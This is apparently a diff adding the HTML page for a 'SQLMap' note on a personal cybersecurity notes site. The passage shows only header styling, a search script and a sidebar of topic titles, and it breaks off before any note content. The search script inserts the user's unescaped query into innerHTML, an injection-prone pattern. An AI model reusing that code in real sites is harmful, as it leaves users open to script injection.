@@ -1,0 +1,914 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="Personal cybersecurity notes, writeups, and reference vault"><title>SQLMap — CyberHacks</title><link rel="stylesheet" href="/styles/global.css"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><style>.site-header{position:sticky;top:0;z-index:100;height:56px;background:#09070fed;backdrop-filter:blur(16px);border-bottom:1px solid var(--border)}.header-inner{display:flex;align-items:center;gap:2rem;height:100%;padding:0 1.5rem}.logo{display:flex;align-items:center;gap:.5rem;color:var(--text);font-family:var(--font-display);font-weight:800;font-size:1.1rem;text-decoration:none;flex-shrink:0;letter-spacing:-.02em}.logo-icon{color:var(--purple-3)}.logo:hover{color:var(--purple-1)}.header-nav{display:flex;align-items:center;gap:.2rem}.nav-link{color:var(--text-muted);font-size:.78rem;font-weight:500;letter-spacing:.06em;text-transform:uppercase;padding:.35rem .7rem;border-radius:6px;text-decoration:none;transition:color .15s,background .15s;position:relative}.nav-link:hover{color:var(--purple-1);background:var(--surface)}.nav-link.active{color:var(--purple-2);background:var(--surface)}.nav-link.active:after{content:"";position:absolute;bottom:-1px;left:.7rem;right:.7rem;height:2px;background:var(--purple-3);border-radius:2px 2px 0 0}.hdr-search{position:relative;flex-shrink:0}.hdr-search-box{display:flex;align-items:center;gap:.4rem;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:.28rem .6rem;width:210px;transition:border-color .15s;cursor:text}.hdr-search-box:focus-within{border-color:var(--purple-3)}#hdr-input{background:transparent;border:none;outline:none;color:var(--text);font-size:.8rem;font-family:var(--font-sans);width:100%}#hdr-input::placeholder{color:var(--text-dim)}.hdr-search-box kbd{font-size:.58rem;background:var(--surface-2);border:1px solid var(--border-2);border-radius:4px;padding:.1rem .3rem;color:var(--text-dim);flex-shrink:0}.hdr-dropdown{position:absolute;top:calc(100% + 6px);right:0;width:380px;background:#0b0814fa;border:1px solid var(--border-2);border-radius:10px;box-shadow:0 20px 60px #000000b3;padding:.35rem;z-index:999}#hdr-results{display:flex;flex-direction:column;gap:.25rem;max-height:420px;overflow-y:auto;overflow-x:hidden;scrollbar-width:thin;scrollbar-color:var(--border-2) transparent}#hdr-results::-webkit-scrollbar{width:3px}#hdr-results::-webkit-scrollbar-track{background:transparent}#hdr-results::-webkit-scrollbar-thumb{background:var(--border-2);border-radius:3px}#hdr-results::-webkit-scrollbar-thumb:hover{background:var(--purple-3)}.hdr-result{display:block;padding:.6rem .75rem;background:#140f22cc;border:1px solid rgba(42,32,64,.9);border-radius:8px;text-decoration:none;transition:background .15s,border-color .15s,transform .15s;cursor:pointer;overflow:hidden}.hdr-result:hover{background:#5a3db833;border-color:var(--purple-3);transform:translate(2px);pointer-events:auto}.hdr-result-title{font-size:.82rem;font-weight:600;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;line-height:1.3;margin-bottom:.2rem}.hdr-result:hover .hdr-result-title{color:var(--purple-1)}.hdr-result-path{font-size:.62rem;color:var(--text-dim);text-transform:capitalize;letter-spacing:.02em}.hdr-result-path span{color:var(--purple-3);font-weight:700;letter-spacing:.08em;text-transform:uppercase;font-size:.58rem}.hdr-empty{padding:1rem;text-align:center;color:var(--text-dim);font-size:.76rem}.hdr-view-all{display:block;margin-top:.3rem;padding:.45rem .75rem;background:#140f2280;border:1px solid var(--border);border-radius:7px;font-size:.7rem;color:var(--text-muted);text-align:center;text-decoration:none;transition:color .15s,border-color .15s;flex-shrink:0}.hdr-view-all:hover{color:var(--purple-2);border-color:var(--purple-3);background:#140f2280;transform:none}.hdr-result-excerpt{font-size:.62rem;color:var(--text-muted);line-height:1.35;margin-top:.25rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:100%}.hdr-result-excerpt mark{background:#7c5ce84d;color:var(--purple-1);border-radius:2px;padding:0 2px;font-style:normal}@media(max-width:768px){.header-nav,.hdr-search-box kbd{display:none}.hdr-dropdown{width:calc(100vw - 2rem);right:-.5rem}}
+</style><link rel="stylesheet" href="/_astro/_..CUfV36Wy.css"></head> <body> <div class="bg-gradient"></div> <div class="bg-noise"></div> <div class="bg-grid"></div> <div class="site-wrap">  <header class="site-header"> <div class="header-inner"> <a href="/" class="logo"> <span class="logo-icon">⬡</span> <span class="logo-text">CyberHacks</span> </a> <nav class="header-nav"> <a href="/knowledge" class="nav-link "> Knowledge </a><a href="/techniques" class="nav-link "> Techniques </a><a href="/playbooks" class="nav-link "> Playbooks </a><a href="/tools" class="nav-link active"> Tools </a><a href="/resources" class="nav-link "> Resources </a><a href="/labs" class="nav-link "> Labs </a> </nav> <div class="hdr-search" id="hdr-search"> <div class="hdr-search-box"> <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="color:var(--text-dim);flex-shrink:0"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.35-4.35"></path></svg> <input id="hdr-input" type="text" placeholder="Search notes..." autocomplete="off" spellcheck="false"> <kbd>⌘K</kbd> </div> <div class="hdr-dropdown" id="hdr-dropdown" style="display:none"> <div id="hdr-results"></div> <a id="hdr-all" href="/search" class="hdr-view-all">View all results →</a> </div> </div> </div> </header>  <script>
+(function(){
+  let pf = null;
+  let timer = null;
+  const input = document.getElementById('hdr-input');
+  const dropdown = document.getElementById('hdr-dropdown');
+  const results = document.getElementById('hdr-results');
+  const viewAll = document.getElementById('hdr-all');
+  if(!input) return;
+
+  async function init() {
+    if(pf) return pf;
+    try {
+      pf = await import('/pagefind/pagefind.js');
+      await pf.init();
+    } catch(e){ pf=null; }
+    return pf;
+  }
+
+  input.addEventListener('focus', init);
+
+  input.addEventListener('input', ()=>{
+    clearTimeout(timer);
+    timer = setTimeout(async ()=>{
+      const q = input.value.trim();
+      if(!q){ dropdown.style.display='none'; return; }
+
+      const lib = await init();
+      if(!lib){
+        results.innerHTML = '<div class="hdr-empty">Run a build to enable search.</div>';
+        dropdown.style.display='block';
+        return;
+      }
+
+      const res = await lib.search(q);
+      const top = await Promise.all(res.results.slice(0,5).map(r=>r.data()));
+      viewAll.href = '/search?q='+encodeURIComponent(q);
+
+      if(!top.length){
+        results.innerHTML = '<div class="hdr-empty">No results for "'+q+'"</div>';
+      } else {
+        results.innerHTML = top.map(r=>{
+          const parts = r.url.split('/').filter(Boolean);
+          const cat = parts[0]||'';
+          const sub = parts.length>2 ? parts[1].replace(/-/g,' ') : '';
+          const title = (r.meta&&r.meta.title||'')
+            .replace(/\s*[—–-]+\s*CyberHacks\s*$/i,'').trim()
+            || parts[parts.length-1].replace(/-/g,' ');
+          const path = sub ? `<span>${cat}</span> / ${sub}` : `<span>${cat}</span>`;
+          const excerpt = (r.excerpt||'')
+            .replace(/<(?!\/?mark)[^>]+>/g,'')
+            .replace(/\s+/g,' ')
+            .replace(/^[\s\/\-–—]+/,'')
+            .trim()
+            .slice(0,90);
+          return '<a href="'+r.url+'" class="hdr-result">'
+            +'<div class="hdr-result-title">'+title+'</div>'
+            +'<div class="hdr-result-path">'+path+'</div>'
+            +(excerpt?'<div class="hdr-result-excerpt">'+excerpt+'</div>':'')
+            +'</a>';
+        }).join('');
+      }
+      dropdown.style.display='block';
+    }, 180);
+  });
+
+  document.addEventListener('click', e=>{
+    if(!document.getElementById('hdr-search').contains(e.target))
+      dropdown.style.display='none';
+  });
+
+  document.addEventListener('keydown', e=>{
+    if((e.metaKey||e.ctrlKey)&&e.key==='k'){
+      e.preventDefault(); input.focus(); input.select();
+    }
+    if(e.key==='Escape'){ dropdown.style.display='none'; input.blur(); }
+    if(e.key==='Enter'&&dropdown.style.display!=='none'&&input.value.trim())
+      window.location.href='/search?q='+encodeURIComponent(input.value.trim());
+  });
+})();
+</script> <div class="note-shell" data-astro-cid-o5gmpz7g> <aside class="sidebar" id="sidebar" data-astro-cid-o5gmpz7g> <div class="sidebar-inner" data-astro-cid-o5gmpz7g> <nav class="sidebar-nav" data-astro-cid-o5gmpz7g> <nav class="sidebar-tree" data-astro-cid-gvqsdny3> <div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge" class="cat-label-link " data-astro-cid-gvqsdny3> Knowledge </a> <span class="cat-count" data-astro-cid-gvqsdny3>91</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Artificial%20Intelligence" class="subcat-label-link " data-astro-cid-gvqsdny3> Artificial Intelligence </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/artificial-intelligence/ai-ml-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> AI ML Fundamentals </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Core%20Security%20Concepts" class="subcat-label-link " data-astro-cid-gvqsdny3> Core Security Concepts </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/core-security-concepts/cyber-kill-chain" class="nav-note " data-astro-cid-gvqsdny3> Cyber Kill Chain </a><a href="/knowledge/core-security-concepts/ddos" class="nav-note " data-astro-cid-gvqsdny3> DDoS </a><a href="/knowledge/core-security-concepts/insider-threat" class="nav-note " data-astro-cid-gvqsdny3> Insider Threat </a><a href="/knowledge/core-security-concepts/mitre-attck-framework" class="nav-note " data-astro-cid-gvqsdny3> MITRE ATTCK Framework </a><a href="/knowledge/core-security-concepts/osint" class="nav-note " data-astro-cid-gvqsdny3> OSINT </a><a href="/knowledge/core-security-concepts/ransomware" class="nav-note " data-astro-cid-gvqsdny3> Ransomware </a><a href="/knowledge/core-security-concepts/security-domains" class="nav-note " data-astro-cid-gvqsdny3> Security Domains </a><a href="/knowledge/core-security-concepts/security-principles" class="nav-note " data-astro-cid-gvqsdny3> Security Principles </a><a href="/knowledge/core-security-concepts/social-engineering" class="nav-note " data-astro-cid-gvqsdny3> Social Engineering </a><a href="/knowledge/core-security-concepts/threat-actors" class="nav-note " data-astro-cid-gvqsdny3> Threat Actors </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Cryptography" class="subcat-label-link " data-astro-cid-gvqsdny3> Cryptography </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/cryptography/cryptography-basics" class="nav-note " data-astro-cid-gvqsdny3> Cryptography Basics </a><a href="/knowledge/cryptography/hashing-basics" class="nav-note " data-astro-cid-gvqsdny3> Hashing Basics </a><a href="/knowledge/cryptography/public-key-basics" class="nav-note " data-astro-cid-gvqsdny3> Public Key Basics </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Defensive%20Security" class="subcat-label-link " data-astro-cid-gvqsdny3> Defensive Security </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/defensive-security/defensive-security-intro" class="nav-note " data-astro-cid-gvqsdny3> Defensive Security Intro </a><a href="/knowledge/defensive-security/digital-forensics-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Digital Forensics Fundamentals </a><a href="/knowledge/defensive-security/incident-response-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Incident Response Fundamentals </a><a href="/knowledge/defensive-security/log-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Log Fundamentals </a><a href="/knowledge/defensive-security/network-traffic-analysis" class="nav-note " data-astro-cid-gvqsdny3> Network Traffic Analysis </a><a href="/knowledge/defensive-security/soc-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> SOC Fundamentals </a><a href="/knowledge/defensive-security/threat-hunting" class="nav-note " data-astro-cid-gvqsdny3> Threat Hunting </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Security%20Solutions" class="subcat-label-link " data-astro-cid-gvqsdny3> Security Solutions </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/defensive-security/security-solutions/intro-to-siem" class="nav-note " data-astro-cid-gvqsdny3> Intro To SIEM </a><a href="/knowledge/defensive-security/security-solutions/intrusion-detection-systems-ids" class="nav-note " data-astro-cid-gvqsdny3> Intrusion Detection Systems IDS </a><a href="/knowledge/defensive-security/security-solutions/siem-use-case-development" class="nav-note " data-astro-cid-gvqsdny3> SIEM Use Case Development </a><a href="/knowledge/defensive-security/security-solutions/vulnerability-scanners" class="nav-note " data-astro-cid-gvqsdny3> Vulnerability Scanners </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Foundational%20Cs" class="subcat-label-link " data-astro-cid-gvqsdny3> Foundational Cs </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/foundational-cs/arm-processor-architecture" class="nav-note " data-astro-cid-gvqsdny3> ARM Processor Architecture </a><a href="/knowledge/foundational-cs/cpu-architecture" class="nav-note " data-astro-cid-gvqsdny3> CPU Architecture </a><a href="/knowledge/foundational-cs/data-representation" class="nav-note " data-astro-cid-gvqsdny3> Data Representation </a><a href="/knowledge/foundational-cs/input-and-output" class="nav-note " data-astro-cid-gvqsdny3> Input And Output </a><a href="/knowledge/foundational-cs/memory-architecture" class="nav-note " data-astro-cid-gvqsdny3> Memory Architecture </a><a href="/knowledge/foundational-cs/multi-processing" class="nav-note " data-astro-cid-gvqsdny3> Multi Processing </a><a href="/knowledge/foundational-cs/x86-architecture" class="nav-note " data-astro-cid-gvqsdny3> X86 Architecture </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Networking" class="subcat-label-link " data-astro-cid-gvqsdny3> Networking </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/networking/data-transmission-methods" class="nav-note " data-astro-cid-gvqsdny3> Data Transmission Methods </a><a href="/knowledge/networking/dns-domain-name-system" class="nav-note " data-astro-cid-gvqsdny3> DNS Domain Name System </a><a href="/knowledge/networking/firewalls" class="nav-note " data-astro-cid-gvqsdny3> Firewalls </a><a href="/knowledge/networking/ftp" class="nav-note " data-astro-cid-gvqsdny3> FTP </a><a href="/knowledge/networking/http-https" class="nav-note " data-astro-cid-gvqsdny3> HTTP HTTPS </a><a href="/knowledge/networking/imap-pop3" class="nav-note " data-astro-cid-gvqsdny3> IMAP POP3 </a><a href="/knowledge/networking/ip-addressing" class="nav-note " data-astro-cid-gvqsdny3> IP Addressing </a><a href="/knowledge/networking/ipmi" class="nav-note " data-astro-cid-gvqsdny3> IPMI </a><a href="/knowledge/networking/lan-topologies" class="nav-note " data-astro-cid-gvqsdny3> LAN Topologies </a><a href="/knowledge/networking/mssql" class="nav-note " data-astro-cid-gvqsdny3> MSSQL </a><a href="/knowledge/networking/mysql" class="nav-note " data-astro-cid-gvqsdny3> MySQL </a><a href="/knowledge/networking/network-media-connections" class="nav-note " data-astro-cid-gvqsdny3> Network Media Connections </a><a href="/knowledge/networking/networking-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Networking Fundamentals </a><a href="/knowledge/networking/nfs" class="nav-note " data-astro-cid-gvqsdny3> NFS </a><a href="/knowledge/networking/oracle-tns" class="nav-note " data-astro-cid-gvqsdny3> Oracle TNS </a><a href="/knowledge/networking/osi-model" class="nav-note " data-astro-cid-gvqsdny3> OSI Model </a><a href="/knowledge/networking/packets-and-frames" class="nav-note " data-astro-cid-gvqsdny3> Packets And Frames </a><a href="/knowledge/networking/ports" class="nav-note " data-astro-cid-gvqsdny3> Ports </a><a href="/knowledge/networking/protocols" class="nav-note " data-astro-cid-gvqsdny3> Protocols </a><a href="/knowledge/networking/smb" class="nav-note " data-astro-cid-gvqsdny3> SMB </a><a href="/knowledge/networking/smtp" class="nav-note " data-astro-cid-gvqsdny3> SMTP </a><a href="/knowledge/networking/snmp" class="nav-note " data-astro-cid-gvqsdny3> SNMP </a><a href="/knowledge/networking/subnetting" class="nav-note " data-astro-cid-gvqsdny3> Subnetting </a><a href="/knowledge/networking/tls-ssl" class="nav-note " data-astro-cid-gvqsdny3> TLS SSL </a><a href="/knowledge/networking/vpn-basics" class="nav-note " data-astro-cid-gvqsdny3> VPN Basics </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Offensive%20Security" class="subcat-label-link " data-astro-cid-gvqsdny3> Offensive Security </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/offensive-security/footprinting-enumeration" class="nav-note " data-astro-cid-gvqsdny3> Footprinting Enumeration </a><a href="/knowledge/offensive-security/offensive-security-intro" class="nav-note " data-astro-cid-gvqsdny3> Offensive Security Intro </a><a href="/knowledge/offensive-security/pentesting-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Pentesting Fundamentals </a><a href="/knowledge/offensive-security/web-reconnaissance" class="nav-note " data-astro-cid-gvqsdny3> Web Reconnaissance </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Operating%20Systems" class="subcat-label-link " data-astro-cid-gvqsdny3> Operating Systems </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/operating-systems/boot-and-file-systems" class="nav-note " data-astro-cid-gvqsdny3> Boot And File Systems </a><a href="/knowledge/operating-systems/containerization" class="nav-note " data-astro-cid-gvqsdny3> Containerization </a><a href="/knowledge/operating-systems/operating-system-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Operating System Fundamentals </a><a href="/knowledge/operating-systems/operating-system-internals" class="nav-note " data-astro-cid-gvqsdny3> Operating System Internals </a><a href="/knowledge/operating-systems/solaris" class="nav-note " data-astro-cid-gvqsdny3> Solaris </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Linux" class="subcat-label-link " data-astro-cid-gvqsdny3> Linux </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/operating-systems/linux/linux-file-system" class="nav-note " data-astro-cid-gvqsdny3> Linux File System </a><a href="/knowledge/operating-systems/linux/linux-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Linux Fundamentals </a><a href="/knowledge/operating-systems/linux/linux-hardening" class="nav-note " data-astro-cid-gvqsdny3> Linux Hardening </a><a href="/knowledge/operating-systems/linux/linux-networking" class="nav-note " data-astro-cid-gvqsdny3> Linux Networking </a><a href="/knowledge/operating-systems/linux/linux-shells" class="nav-note " data-astro-cid-gvqsdny3> Linux Shells </a><a href="/knowledge/operating-systems/linux/linux-system-management" class="nav-note " data-astro-cid-gvqsdny3> Linux System Management </a><a href="/knowledge/operating-systems/linux/shell-scripting" class="nav-note " data-astro-cid-gvqsdny3> Shell Scripting </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Windows" class="subcat-label-link " data-astro-cid-gvqsdny3> Windows </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/operating-systems/windows/event-tracing-for-windows-etw" class="nav-note " data-astro-cid-gvqsdny3> Event Tracing For Windows ETW </a><a href="/knowledge/operating-systems/windows/windows-command-line" class="nav-note " data-astro-cid-gvqsdny3> Windows Command Line </a><a href="/knowledge/operating-systems/windows/windows-event-logs" class="nav-note " data-astro-cid-gvqsdny3> Windows Event Logs </a><a href="/knowledge/operating-systems/windows/windows-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Windows Fundamentals </a><a href="/knowledge/operating-systems/windows/windows-powershell" class="nav-note " data-astro-cid-gvqsdny3> Windows PowerShell </a><a href="/knowledge/operating-systems/windows/windows-remote-management" class="nav-note " data-astro-cid-gvqsdny3> Windows Remote Management </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Active%20Directory" class="subcat-label-link " data-astro-cid-gvqsdny3> Active Directory </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/operating-systems/windows/active-directory/active-directory-basics" class="nav-note " data-astro-cid-gvqsdny3> Active Directory Basics </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Web%20Security" class="subcat-label-link " data-astro-cid-gvqsdny3> Web Security </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/web-security/certificate-transparency-logs" class="nav-note " data-astro-cid-gvqsdny3> Certificate Transparency Logs </a><a href="/knowledge/web-security/javascript-essentials" class="nav-note " data-astro-cid-gvqsdny3> JavaScript Essentials </a><a href="/knowledge/web-security/owasp-top-10---2021" class="nav-note " data-astro-cid-gvqsdny3> OWASP Top 10   2021 </a><a href="/knowledge/web-security/sql-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> SQL Fundamentals </a><a href="/knowledge/web-security/virtual-hosts" class="nav-note " data-astro-cid-gvqsdny3> Virtual Hosts </a><a href="/knowledge/web-security/web-apis" class="nav-note " data-astro-cid-gvqsdny3> Web APIs </a><a href="/knowledge/web-security/web-application-proxies" class="nav-note " data-astro-cid-gvqsdny3> Web Application Proxies </a><a href="/knowledge/web-security/web-crawling" class="nav-note " data-astro-cid-gvqsdny3> Web Crawling </a><a href="/knowledge/web-security/web-fingerprinting" class="nav-note " data-astro-cid-gvqsdny3> Web Fingerprinting </a><a href="/knowledge/web-security/website-innerworkings" class="nav-note " data-astro-cid-gvqsdny3> Website Innerworkings </a><a href="/knowledge/web-security/wordpress" class="nav-note " data-astro-cid-gvqsdny3> WordPress </a> </div> </div> </div> </div><div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/techniques" class="cat-label-link " data-astro-cid-gvqsdny3> Techniques </a> <span class="cat-count" data-astro-cid-gvqsdny3>10</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <a href="/techniques/api-fuzzing" class="nav-note " data-astro-cid-gvqsdny3> API Fuzzing </a><a href="/techniques/command-injection" class="nav-note " data-astro-cid-gvqsdny3> Command Injection </a><a href="/techniques/dns-enumeration" class="nav-note " data-astro-cid-gvqsdny3> DNS Enumeration </a><a href="/techniques/javascript-deobfuscation" class="nav-note " data-astro-cid-gvqsdny3> JavaScript Deobfuscation </a><a href="/techniques/sql-injection" class="nav-note " data-astro-cid-gvqsdny3> SQL Injection </a><a href="/techniques/subdomain-enumeration" class="nav-note " data-astro-cid-gvqsdny3> Subdomain Enumeration </a><a href="/techniques/vhost-fuzzing" class="nav-note " data-astro-cid-gvqsdny3> VHost Fuzzing </a><a href="/techniques/wordpress-attacks" class="nav-note " data-astro-cid-gvqsdny3> WordPress Attacks </a><a href="/techniques/xss" class="nav-note " data-astro-cid-gvqsdny3> XSS </a><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/techniques?filter=Cryptography%20Attacks" class="subcat-label-link " data-astro-cid-gvqsdny3> Cryptography Attacks </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/techniques/cryptography-attacks/rsa-cracking" class="nav-note " data-astro-cid-gvqsdny3> RSA Cracking </a> </div> </div> </div> </div><div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/playbooks" class="cat-label-link " data-astro-cid-gvqsdny3> Playbooks </a> <span class="cat-count" data-astro-cid-gvqsdny3>6</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <a href="/playbooks/linux-forensics-playbook" class="nav-note " data-astro-cid-gvqsdny3> Linux Forensics Playbook </a><a href="/playbooks/linux-pentest-playbook" class="nav-note " data-astro-cid-gvqsdny3> Linux Pentest Playbook </a><a href="/playbooks/osint-playbook" class="nav-note " data-astro-cid-gvqsdny3> OSINT Playbook </a><a href="/playbooks/windows-pentest-playbook" class="nav-note " data-astro-cid-gvqsdny3> Windows Pentest Playbook </a><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/playbooks?filter=Methodologies" class="subcat-label-link " data-astro-cid-gvqsdny3> Methodologies </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/playbooks/methodologies/blue-team" class="nav-note " data-astro-cid-gvqsdny3> Blue Team </a><a href="/playbooks/methodologies/red-team" class="nav-note " data-astro-cid-gvqsdny3> Red Team </a> </div> </div> </div> </div><div class="cat-group" data-open="true" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools" class="cat-label-link active" data-astro-cid-gvqsdny3> Tools </a> <span class="cat-count" data-astro-cid-gvqsdny3>63</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Cryptography" class="subcat-label-link " data-astro-cid-gvqsdny3> Cryptography </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/cryptography/cyberchef" class="nav-note " data-astro-cid-gvqsdny3> CyberChef </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Defense%20Monitoring" class="subcat-label-link " data-astro-cid-gvqsdny3> Defense Monitoring </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/defense-monitoring/elastic-stack" class="nav-note " data-astro-cid-gvqsdny3> Elastic Stack </a><a href="/tools/defense-monitoring/iptables" class="nav-note " data-astro-cid-gvqsdny3> Iptables </a><a href="/tools/defense-monitoring/silketw" class="nav-note " data-astro-cid-gvqsdny3> SilkETW </a><a href="/tools/defense-monitoring/snort" class="nav-note " data-astro-cid-gvqsdny3> Snort </a><a 